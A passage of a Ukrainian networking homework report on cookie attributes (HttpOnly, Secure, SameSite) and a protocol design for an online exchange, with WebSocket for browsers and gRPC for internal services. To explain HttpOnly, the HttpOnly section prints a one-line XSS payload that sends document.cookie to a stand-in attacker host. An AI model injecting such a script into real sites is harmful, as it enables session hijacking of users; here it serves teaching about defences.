Браузер отримав **обидві** cookie, але JavaScript бачить **лише `theme=dark`**. Cookie `session_id` з `HttpOnly` для скриптів невидима, хоча браузер і далі автоматично надсилатиме її серверу в кожному запиті.

### Від якої атаки захищає `HttpOnly`

**`HttpOnly` захищає від крадіжки cookie через XSS (Cross-Site Scripting)**, тобто від викрадення сесії (session hijacking).

Як виглядає атака без `HttpOnly`:
1. Сайт має вразливість XSS, наприклад, коментар користувача виводиться на сторінку без екранування.
2. Зловмисник залишає «коментар» зі скриптом:
   ```html
   <script>new Image().src = "https://evil.example/steal?c=" + document.cookie</script>
   ```
3. Кожен, хто відкриє сторінку, виконує цей скрипт у своєму браузері. Скрипт читає `document.cookie`, тобто і сесійну cookie, і відправляє її на сервер зловмисника.
4. Зловмисник підставляє викрадену cookie у свій браузер і **входить в акаунт жертви без пароля** (і без 2FA, бо сесія вже автентифікована).

З `HttpOnly` на кроці 3 `document.cookie` повертає рядок без сесійної cookie, як і в моїй демонстрації (`theme=dark` без `session_id`). Скрипт зловмисника не може її прочитати, а отже, і вкрасти. `HttpOnly` не прибирає саму XSS-вразливість (скрипт усе ще може робити дії від імені користувача на відкритій сторінці), але унеможливлює **викрадення** сесії і використання її з іншого комп'ютера.

### Роль атрибута `Secure`

**`Secure` - браузер надсилає cookie лише по зашифрованому з'єднанню HTTPS і ніколи по відкритому HTTP.**

Навіщо це потрібно:
* **Захист від перехоплення (sniffing / MITM).** Якщо cookie без `Secure`, то при будь-якому запиті по `http://` (наприклад, користувач набрав адресу без `https`, або на сторінці є старе посилання чи картинка по HTTP) браузер відправить cookie **відкритим текстом**. У публічному Wi-Fi її може побачити будь-хто з `tcpdump`/Wireshark, як ми бачили пакети в ДЗ №2. З `Secure` cookie йде тільки всередині TLS, зашифрована `TLS_AES_128_GCM_SHA256` із завдання 3.
* **Захист від підміни.** Сучасні браузери не дозволяють незахищеному `http://`-сайту встановити або перезаписати cookie з атрибутом `Secure`.
* `Secure` добре працює разом з **HSTS** (`strict-transport-security` у GitHub, завдання 1): HSTS не дає браузеру навіть почати з'єднання по HTTP, а `Secure` гарантує, що cookie не вийде за межі HTTPS навіть у разі помилки.

### Роль атрибута `SameSite` (додатково)

`SameSite` визначає, чи надсилати cookie, коли запит ініціює **інший сайт**. Це захист від **CSRF** (Cross-Site Request Forgery):

| Значення | Поведінка | Приклад |
|---|---|---|
| `Strict` | Cookie надсилається лише з того самого сайту | Перехід за посиланням з пошти на GitHub відкриється «не залогіненим» |
| **`Lax`** (у GitHub) | Надсилається при звичайному переході за посиланням (GET верхнього рівня), але **не** надсилається з чужих форм POST, `<iframe>`, `fetch`/AJAX | Посилання працює, а прихована форма на `evil.example`, яка робить POST на GitHub, прийде без сесії |
| `None` | Надсилається завжди, але **обов'язково** разом із `Secure` | Віджети, вбудовані на інші сайти |

### Висновок до завдання 4

На github.com сесійна cookie **`_gh_sess`** має повний набір захисту: **`HttpOnly`** (JavaScript не може її прочитати, тому її не вкрасти через XSS), **`Secure`** (передається лише по HTTPS, тому її не перехопити в мережі) і **`SameSite=Lax`** (не надсилається з чужих сайтів, що захищає від CSRF). Аналітична `_octo` свідомо без `HttpOnly`, бо її читає JavaScript і вона не дає доступу до акаунта. Дію `HttpOnly` я перевірив на практиці в браузері: `document.cookie` показав лише cookie без цього атрибута.

---

## Завдання 5. Архітектурне моделювання (кейс онлайн-біржі)

### Умови

* Ціни на акції змінюються **щосекунди**, а для популярних тікерів і частіше.
* Користувачі дивляться графіки в **браузері**.
* Внутрішні сервіси **білінг** і **облік акцій** (портфелі, залишки) мають спілкуватися з **мінімальною затримкою**.

Вимоги до двох сценаріїв принципово різні, тому й протоколи будуть різні.

### Сценарій А: оновлення графіків цін у браузері в реальному часі

**Вибір: WebSocket (`wss://`, тобто WebSocket поверх TLS).**

#### Чому не звичайний HTTP

| Підхід | Як працює | Проблема для біржі |
|---|---|---|
| **Short polling** (`GET /price` щосекунди) | Браузер постійно питає «є нові ціни?» | На кожне оновлення - повний HTTP-запит з заголовками (сотні байт, cookie). Більшість відповідей «нічого нового». Затримка до 1 інтервалу опитування. 100 000 користувачів × 1 запит/с = 100 000 запитів/с на сервер |
| **Long polling** | Сервер тримає запит, доки не з'являться дані | Після кожної відповіді потрібен новий запит, а ціни змінюються постійно, тож це майже те саме навантаження |
| **SSE** (Server-Sent Events) | Одне HTTP-з'єднання, сервер «стрімить» події | Добрий кандидат, але канал **лише в один бік** (сервер → клієнт) і лише текст. Підписка на інші тікери потребує окремих HTTP-запитів |
| **WebSocket** | Одне постійне з'єднання, обмін повідомленнями **в обидва боки** | Підходить |

#### Чому саме WebSocket

1. **Push від сервера.** Сервер надсилає нову ціну в момент зміни, без запиту клієнта. Затримка визначається лише мережею (десятки мс), а не інтервалом опитування.
2. **Одне постійне з'єднання.** TCP- і TLS-рукостискання виконуються **один раз** при відкритті сторінки, а не на кожне оновлення. У ДЗ №2 я показав, що TCP-рукостискання додає цілий RTT (`dig` через TCP - 43 мс проти 21 мс). Тут цю ціну ми платимо лише раз.
3. **Мінімальні накладні витрати.** Заголовок кадру WebSocket - **2-14 байт** замість сотень байт HTTP-заголовків і cookie в кожному запиті. Повідомлення з ціною `{"s":"AAPL","p":189.42,"t":…}` займає ~40 байт.
4. **Двосторонній канал (full-duplex).** Браузер у тому самому з'єднанні може надсилати команди: підписатися на тікер, відписатися, змінити таймфрейм графіка. SSE так не вміє.
5. **Підтримка бінарних даних.** За великої кількості тікерів можна передавати компактні бінарні кадри (MessagePack / Protobuf) замість JSON.
6. **Стандарт браузерів** (RFC 6455) - вбудований API `WebSocket` у всіх браузерах, без плагінів.

#### Як відкривається WebSocket - перевірено на практиці

WebSocket стартує як звичайний HTTP-запит з проханням змінити протокол (`Upgrade`). Я перевірив це на публічному echo-сервері:

```bash
curl -i -N --http1.1 \
     -H "Connection: Upgrade" -H "Upgrade: websocket" \
     -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
     https://echo.websocket.org/
```

```
HTTP/1.1 101 Switching Protocols
upgrade: websocket
connection: Upgrade
sec-websocket-accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
date: Mon, 23 Nov 2026 09:38:35 GMT
```

Сервер відповів **`101 Switching Protocols`**: з цього моменту в тому самому TCP/TLS-з'єднанні вже не HTTP, а кадри WebSocket. `Sec-WebSocket-Accept` - це `base64(SHA1(Sec-WebSocket-Key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"))`. Так сервер доводить, що справді розуміє протокол WebSocket. Для ключа з RFC 6455 правильна відповідь саме `s3pPLMBiTxaQ9kYGzzhZRbK+xOo=`.

#### Схема

```
Біржове ядро (matching engine)
        │ події "ціна змінилась"
        ▼
Сервіс ринкових даних ──► Брокер повідомлень (Kafka / NATS / Redis Pub/Sub)
                                   │ fan-out
              ┌────────────────────┼────────────────────┐
              ▼                    ▼                    ▼
        WS-шлюз #1            WS-шлюз #2            WS-шлюз #N      (горизонтальне масштабування)
              │ wss://             │ wss://             │ wss://
              ▼                    ▼                    ▼
          браузери             браузери             браузери
```

Приклад клієнта в браузері:

```javascript
const ws = new WebSocket("wss://exchange.example/ws/prices");

ws.onopen = () => ws.send(JSON.stringify({ action: "subscribe", symbols: ["AAPL", "TSLA"] }));

ws.onmessage = (event) => {
  const { s, p, t, seq } = JSON.parse(event.data);  // символ, ціна, час, порядковий номер
  chart.update(s, p, t);
};

ws.onclose = () => setTimeout(reconnect, 1000);       // автоматичне перепідключення
```

#### Що потрібно врахувати в реальній системі

* **Тільки `wss://`** (TLS, як у завданні 3). Автентифікація під час рукостискання через сесійну cookie з `HttpOnly; Secure; SameSite` (завдання 4) і **перевірка заголовка `Origin`**, щоб чужий сайт не міг відкрити WebSocket від імені користувача (Cross-Site WebSocket Hijacking).
* **Heartbeat** (кадри `ping`/`pong`), щоб виявляти «мертві» з'єднання і не дати NAT чи проксі закрити неактивний канал.
* **Порядкові номери (`seq`) і знімок при перепідключенні:** після обриву клієнт отримує поточний знімок цін, а далі лише зміни, тож жодне оновлення не губиться.
* **Об'єднання (conflation) оновлень:** якщо ціна змінилась 50 разів за 100 мс, людині на графіку достатньо останнього значення. Це суттєво зменшує трафік.
* **Fallback:** якщо корпоративний проксі блокує WebSocket, перейти на SSE або long polling (так роблять Socket.IO, SignalR).

### Сценарій Б: взаємодія внутрішніх мікросервісів (білінг ↔ облік акцій)

**Вибір: gRPC (HTTP/2 + Protocol Buffers), з mTLS між сервісами.**

#### Чому gRPC

1. **Бінарний формат Protobuf.** Повідомлення в кілька разів менші за JSON і серіалізуються/розбираються значно швидше. Не потрібно розбирати текст і назви полів у кожному повідомленні. Для мінімальної затримки це критично.
2. **HTTP/2 під капотом.**
   * **Одне постійне з'єднання** між сервісами, без нового TCP/TLS-рукостискання на кожен виклик.
   * **Мультиплексування:** сотні одночасних викликів в одному з'єднанні, без блокування один одним, як у HTTP/1.1, де один повільний запит затримує наступні.
   * **Стиснення заголовків HPACK.**
3. **Строгий контракт `.proto` і генерація коду.** Білінг і облік можуть бути написані різними мовами (Go, Java, Python), а клієнт і сервер генеруються з одного файлу. Помилки типу «поле назвали `price`, а не `amount`» виявляються під час компіляції, а не в продакшені. Для фінансових даних це важливо.
4. **Стрімінг в обидва боки.** Облік може тримати відкритий потік і надсилати білінгу кожну операцію в момент виконання, а не чекати запиту.
5. **Deadline / timeout на кожен виклик.** Якщо облік не відповів за 50 мс, білінг отримає помилку `DEADLINE_EXCEEDED` і не «зависне». Дедлайн автоматично передається далі по ланцюжку сервісів.
6. **Стандартні коди помилок** (`NOT_FOUND`, `ALREADY_EXISTS`, `UNAVAILABLE`…), вбудовані повтори, балансування навантаження і health-check.

#### Приклад контракту

```protobuf
syntax = "proto3";
package exchange.v1;

// Сервіс обліку акцій (портфелі та залишки)
service Holdings {
  // Зарезервувати акції під угоду. Унарний виклик: запит -> відповідь
  rpc Reserve(ReserveRequest) returns (ReserveReply);

  // Потік змін позицій для білінгу (server streaming)
  rpc WatchPositions(WatchRequest) returns (stream PositionEvent);
}

message ReserveRequest {
  string idempotency_key = 1;   // захист від подвійного списання при повторі запиту
  string account_id      = 2;
  string symbol          = 3;   // наприклад, "AAPL"
  int64  quantity        = 4;
}

message ReserveReply {
  bool   ok             = 1;
  string reservation_id = 2;
}

message WatchRequest  { string account_id = 1; }

message PositionEvent {
  string account_id = 1;
  string symbol     = 2;
  int64  quantity   = 3;
  int64  price_e6   = 4;        // ціна у мільйонних частках: гроші не зберігаємо у float
  int64  ts_unix_ns = 5;
}
```

Виклик з білінгу (Python, з дедлайном):

```python
reply = holdings_stub.Reserve(
    ReserveRequest(idempotency_key=trade_id, account_id="acc-42", symbol="AAPL", quantity=10),
    timeout=0.05,   # 50 мс, далі DEADLINE_EXCEEDED
)
```

#### Чому не інші варіанти

| Варіант | Чому не основний вибір для цього сценарію |
|---|---|
| **REST + JSON (HTTP/1.1)** | Текстовий формат, більший розмір і повільніший розбір. Немає строгого контракту (потрібен окремий OpenAPI). У HTTP/1.1 немає мультиплексування. Добре підходить для **публічного** API, але не для внутрішнього зв'язку з мінімальною затримкою |
| **GraphQL** | Гнучкі запити для фронтенду, але зайвий шар розбору запитів і складніше кешування. Між двома сервісами з фіксованим набором операцій ця гнучкість не потрібна |
| **WebSocket** | Немає контракту, кодів помилок, дедлайнів і генерації коду. Усе це довелось би писати самому. gRPC дає те саме постійне двостороннє з'єднання «з коробки» |
| **Брокер повідомлень (Kafka, RabbitMQ)** | Асинхронний: додає затримку на запис і читання з черги, а відповідь «зарезервовано / ні» потрібна білінгу **синхронно**. Але брокер добре **доповнює** gRPC: події «угоду виконано» можна паралельно публікувати в Kafka для аудиту, звітності та відновлення після збою |

#### Безпека і надійність

* **mTLS** (взаємний TLS): не лише клієнт перевіряє сертифікат сервера, як у завданні 3, а й сервер перевіряє сертифікат клієнта. Облік прийме виклик лише від справжнього сервісу білінгу. Зазвичай це автоматизує service mesh (Istio, Linkerd).
* **Ключ ідемпотентності** (`idempotency_key`): якщо через таймаут білінг повторить `Reserve`, облік розпізнає повтор і не спише акції двічі. Це та сама проблема неідемпотентного POST, яку я показав у завданні 2.
* **Гроші і кількості - цілі числа** (`int64`, ціна в мільйонних частках), а не `float`, щоб не накопичувати помилки округлення.

### Підсумок до завдання 5

| | Сценарій А: браузер ← ціни | Сценарій Б: білінг ↔ облік |
|---|---|---|
| **Протокол** | **WebSocket (`wss://`)** | **gRPC (HTTP/2 + Protobuf), mTLS** |
| Модель обміну | Сервер push-ить оновлення, клієнт надсилає підписки | Віддалений виклик процедур (RPC) і стріми в обидва боки |
| Формат даних | JSON або бінарний (MessagePack) | Protobuf (бінарний, строгий контракт) |
| З'єднання | Одне постійне на вкладку браузера | Одне постійне HTTP/2 з мультиплексуванням |
| Чому не HTTP polling / REST | Polling: зайві запити і затримка до інтервалу опитування. REST: текст, немає контракту, немає мультиплексування в HTTP/1.1 | |
| Транспорт | TCP + TLS 1.3 | TCP + TLS 1.3 (mTLS) |
| Ключові переваги | Мінімальна затримка доставки, мало накладних витрат, працює в будь-якому браузері | Мінімальна затримка виклику, типобезпека, дедлайни, стрімінг |
| Альтернатива / доповнення | SSE як fallback для однобічного потоку | Kafka для асинхронних подій і аудиту |

Чому не gRPC у браузері і не WebSocket між сервісами: браузери не дають JavaScript прямого доступу до кадрів HTTP/2, тому «чистий» gRPC там недоступний (потрібен проксі gRPC-Web, і повноцінного двостороннього стріму він не підтримує). А між сервісами WebSocket був би «голою трубою» без контракту, дедлайнів і кодів помилок, які gRPC дає одразу. Тому кожен протокол обрано під свої умови: **WebSocket - там, де клієнт браузер, gRPC - там, де обидві сторони наші сервіси.**

---

## Загальний підсумок: зв'язок з моделями OSI та TCP/IP

| Що досліджували | Рівень OSI | Рівень TCP/IP |
|---|---|---|
| HTTP-методи, статус-коди, заголовки, редиректи, кешування (`curl`, мій API) | L7 - прикладний | Прикладний |
| Cookie та атрибути `HttpOnly`, `Secure`, `SameSite` | L7 - прикладний | Прикладний |
| WebSocket, gRPC | L7 - прикладний | Прикладний |
| Формати даних: JSON, form-urlencoded, Protobuf, PEM/Base64 | L6 - представлення | Прикладний |
| TLS: рукостискання, сертифікати, шифр AES-GCM, ALPN, SNI | L6 / L5 - представлення і сеансовий (шифрування, встановлення захищеної сесії) | Між прикладним і транспортним |
| Постійні з'єднання (keep-alive, WebSocket, HTTP/2), TCP-порти 80 і 443 | L4 - транспортний | Транспортний |
| HTTP/3 (`alt-svc: h3`) - працює поверх QUIC, а QUIC поверх UDP | L7 (HTTP/3) + L4 (QUIC/UDP) | Прикладний + транспортний |
